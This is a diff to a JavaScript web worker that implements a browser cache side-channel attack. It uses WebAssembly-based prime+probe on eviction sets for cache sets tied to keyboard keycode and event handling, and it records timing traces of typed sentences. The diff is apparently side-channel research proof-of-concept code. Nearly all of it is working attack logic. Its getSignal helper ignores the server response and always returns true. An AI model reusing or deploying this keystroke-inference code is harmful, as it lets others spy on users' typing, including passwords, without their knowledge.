@@ -406,25 +406,7 @@ function sendMessage(type, payload = undefined) {
     return message.promise;
 }
 
-self.onmessage = function(event) {
-    const data = event.data;
 
-    // Dispatch to the correct message
-    for (let i = 0; i < messages.length; i++) {
-        if (messages[i].id === data.id) {
-            message = messages[i];
-            messages[i] = messages[messages.length - 1];
-            messages.pop();
-
-            message.resolve(data.result);
-            return;
-        }
-    }
-
-    // Unhandled message
-    const text = JSON.stringify(data);
-    self.postMessage({type: 'exception', message: `Unhandled message (Worker): ${text}`});
-}
 
 function getAccessModules() {
     return sendMessage("getAccessModule");
@@ -450,11 +432,14 @@ function getCrossFrameAddress() {
     return sendMessage("getCrossFrameAddress");
 }
 
+
+
+/* -------------------- start of inserted code ------------------------ */
+// main();
+
 function graphKeystrokes(data){
     return sendMessage("graphKeystrokes", data);
 } 
-
-// main();
 
 function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
@@ -764,5 +749,81 @@ async function l3pp_keystrokes_poc(){
     await stopTimer();
 }
 
-l3pp_keystrokes_poc()
+let trace = {"keycode": [], "event": []}
 
+async function simulate_replays(){ 
+
+    /* initialize modules and tools */
+    const {module, memory} = await getAccessModules();
+    const instance = new WebAssembly.Instance(module, {env: {mem: memory}});
+    const buffer = new Uint32Array(memory.buffer);
+    let {wasm_hit, wasm_miss} = instance.exports;
+
+    // Avoid allocate-on-write optimizations
+    buffer.fill(1);
+    buffer.fill(0);
+
+    await startTimer();
+
+    // Build eviction sets
+
+    self.importScripts('evsets/main.js');
+        
+    /* define sets and slices to monitor */
+    const KBD_KEYCODE_SET = 366;
+    const KEYCODE_SLICE = 3;
+    const KBD_EVENT_SET = 413;
+    const EVENT_SLICE = 3;
+
+    let sets = [KBD_KEYCODE_SET, KBD_EVENT_SET];
+    let slices = [KEYCODE_SLICE, EVENT_SLICE];
+
+    evsets = await find_target_evsets(sets, slices, module, memory, buffer);
+    
+    let sentence_index = 0;
+    while(await getSignal("done")){
+        if(await getSignal("start")){
+            log("Processing sentence " + sentence_index)
+            while(!await getSignal("end")){
+                let trace_sec = prime_probe_sec(evsets);
+                trace["keycode"].push(trace_sec[0]);
+                trace["event"].push(trace_sec[1]);
+            }
+            self.postMessage({"type": "sentenceTrace", "trace": trace})
+            trace["keycode"] = []
+            trace["event"] = []
+            sentence_index++;
+        } else {
+            await sleep(10);
+        }
+    }
+
+    await stopTimer();
+}
+
+async function getSignal(signal){
+    const res = await fetch(`http://localhost:8080/get_${signal}`);
+    console.log(res)
+    return true;
+}
+
+self.onmessage = function(event) {
+    data = event.data;
+    // Dispatch to the correct message
+    for (let i = 0; i < messages.length; i++) {
+        if (messages[i].id === data.id) {
+            message = messages[i];
+            messages[i] = messages[messages.length - 1];
+            messages.pop();
+
+            message.resolve(data.result);
+            return;
+        }
+    }
+
+    // Unhandled message
+    const text = JSON.stringify(data);
+    self.postMessage({type: 'exception', message: `Unhandled message (Worker): ${text}`});
+}
+
+simulate_replays();
